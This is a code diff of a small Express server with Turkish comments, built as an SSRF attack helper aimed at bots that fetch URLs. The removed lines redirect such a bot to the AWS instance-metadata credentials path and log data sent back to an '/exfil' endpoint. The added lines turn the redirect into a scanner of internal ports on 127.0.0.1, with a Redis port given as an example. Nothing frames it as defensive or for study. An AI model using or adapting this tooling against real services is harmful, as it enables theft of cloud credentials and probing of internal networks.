@@ -4,37 +4,23 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Gelen istekleri ve query parametrelerini logla
 app.use((req, res, next) => {
     console.log('--- YENİ İSTEK GELDİ ---');
-    console.log('Method:', req.method);
     console.log('URL:', req.url);
     console.log('IP:', req.ip || req.headers['x-forwarded-for']);
-    console.log('Headers:', req.headers);
-    console.log('Query:', req.query);
-    console.log('------------------------');
     next();
 });
 
-// AWS Metadata veya İç Ağ Yönlendiricisi
+// Port Tarayıcı Redirector
 app.get('/redir', (req, res) => {
-    // Hedef olarak doğrudan AWS IMDSv1 Metadata adresini veriyoruz:
-    const target = req.query.target || 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+    // Buraya denemek istediğin portu yazacaksın
+    // Örnek: /redir?port=8080 veya /redir?port=6379
+    const port = req.query.port || '80';
+    const target = `http://127.0.0.1:${port}/`;
     
-    console.log(`[!] Metadata Redirect tetiklendi! Hedef: ${target}`);
+    console.log(`[!] Port Taraması Tetiklendi! Hedef Port: ${port} -> ${target}`);
     
-    // 302 Found ile botu AWS Metadata servisine fırlat
     return res.redirect(302, target);
 });
 
-// Eğer bot metadata'dan okuduğu veriyi query parametresi olarak geri getirirse buraya düşecek
-app.get('/exfil', (req, res) => {
-    console.log('[+] VERİ SIZDIRILDI (EXFIL):', req.query);
-    return res.status(200).send("Data received");
-});
-
-app.use((req, res) => {
-    return res.status(200).send("Collaborator SUCCESS");
-});
-
-app.listen(3000, () => console.log("Metadata Avcısı 3000 portunda devrede!"));
+app.listen(3000, () => console.log("Port Avcısı devrede!"));
